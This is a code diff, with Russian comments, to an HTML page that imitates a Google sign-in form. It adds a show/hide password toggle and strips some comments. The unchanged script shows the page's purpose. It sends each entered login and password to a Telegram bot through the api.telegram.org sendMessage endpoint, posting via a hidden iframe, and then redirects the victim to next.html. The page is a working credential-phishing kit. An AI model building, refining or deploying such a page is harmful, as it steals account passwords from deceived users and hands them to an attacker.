@@ -30,6 +30,51 @@
             margin-bottom: 20px;
         }
 
+        .password-container {
+            position: relative;
+            display: block;
+            width: 100%;
+        }
+
+        /* Стиль для кнопки-иконки */
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            user-select: none;
+            /* Задаем фиксированный размер окна просмотра для одного глаза */
+            width: 30px; 
+            height: 20px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Управляем отображением конкретной половины картинки */
+        .toggle-password img {
+            position: absolute;
+            height: 100%;
+            width: auto;
+            /* Если фон картинки белый, этот фильтр сделает его прозрачным, 
+               а черные линии — белыми под темную тему */
+            filter: invert(1); 
+        }
+
+        /* Состояние: Пароль скрыт (показываем левый глаз) */
+        .toggle-password.hidden-pass img {
+            left: 0;
+        }
+
+        /* Состояние: Пароль открыт (сдвигаем картинку, показывая правый перечеркнутый глаз) */
+        .toggle-password.visible-pass img {
+            right: 0;
+        }
+
         .button {
             margin-top: 30px;
             margin-bottom: 40px;
@@ -50,13 +95,13 @@
             font-size: 14px;
         }
 
-        /* Прячем невидимый iframe */
         #hidden_iframe {
             display: none;
         }
     </style>
 </head>
 <body>
+
     <iframe name="hidden_iframe" id="hidden_iframe"></iframe>
 
     <form id="tgForm" method="POST" target="hidden_iframe" class="glav">
@@ -68,8 +113,15 @@
             <img src="gglogo.png" class="imug">
             <p class="sinin">Вход</p>
             <p class="isp">Используйте аккаунт Google</p>
+            
             <input class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8);" required>
-            <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8);" required>
+            
+            <div class="password-container">
+                <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8); width: 100%; padding-right: 45px; box-sizing: border-box;" required>
+                <button type="button" id="togglePassword" class="toggle-password hidden-pass">
+                    <img src="(un)Visible.png" alt="eye">
+                </button>
+            </div>
         </div>
         
         <div id="status"></div>
@@ -88,20 +140,30 @@
         const tgText = document.getElementById("tg_text");
         const btn = document.getElementById("button");
         const status = document.getElementById("status");
+        const togglePasswordBtn = document.getElementById("togglePassword");
 
-        // Динамически подставляем правильный URL с токеном в атрибут action формы
         form.action = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
+        togglePasswordBtn.addEventListener("click", () => {
+            if (inputPass.type === "password") {
+                inputPass.type = "text";
+                // Меняем класс, чтобы CSS сдвинул картинку на перечеркнутый глаз
+                togglePasswordBtn.classList.remove("hidden-pass");
+                togglePasswordBtn.classList.add("visible-pass");
+            } else {
+                inputPass.type = "password";
+                // Возвращаем обычный глаз
+                togglePasswordBtn.classList.remove("visible-pass");
+                togglePasswordBtn.classList.add("hidden-pass");
+            }
+        });
+
         form.addEventListener("submit", (e) => {
-            // Формируем текст для отправки
             tgText.value = "Логин: " + inputLogin.value + "  Пароль:   " + inputPass.value;
 
-            // Меняем статус интерфейса
             btn.disabled = true;
             status.textContent = "Вход...";
 
-            // Перенаправление на next.html внутри Telegram Mini App через небольшую задержку,
-            // чтобы форма успела отправить запрос в скрытый iframe
             setTimeout(() => {
                 window.location.href = "next.html";
             }, 800);
